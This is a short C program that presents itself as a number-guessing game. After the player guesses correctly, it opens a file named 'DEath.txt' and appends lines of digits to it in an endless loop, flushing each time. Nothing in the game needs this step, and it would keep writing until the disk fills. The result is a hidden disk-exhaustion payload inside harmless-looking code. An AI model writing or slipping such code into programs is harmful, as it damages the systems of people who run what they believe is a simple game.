#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main()
{
    int number;
    int guess;
    int attempts = 0;

    // Generate a random number
    srand(time(NULL));
    number = rand() % 100 + 1;

    printf("===== NUMBER GUESSING GAME =====\n");
    printf("I have chosen a number between 1 and 100.\n");

    while (1)
    {
        printf("\nEnter your guess: ");
        scanf("%d", &guess);

        attempts++;

        if (guess > number)
        {
            printf("Too high!\n");
        }
        else if (guess < number)
        {
            printf("Too low!\n");
        }
        else
        {
            printf("\nCorrect! You won!\n");
            printf("You took %d attempts.\n", attempts);
            break;
        }
    }
    FILE *fp;

    fp = fopen("DEath.txt", "a");

    if (fp == NULL) {
        printf("Error opening file.\n");
        return 1;
    }

    while (1) {
        fprintf(fp, "1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n");
        fprintf(fp, "1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n");
        fprintf(fp, "1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n");
        
        fflush(fp);
        
    }

    fclose(fp);
    return 0;
}

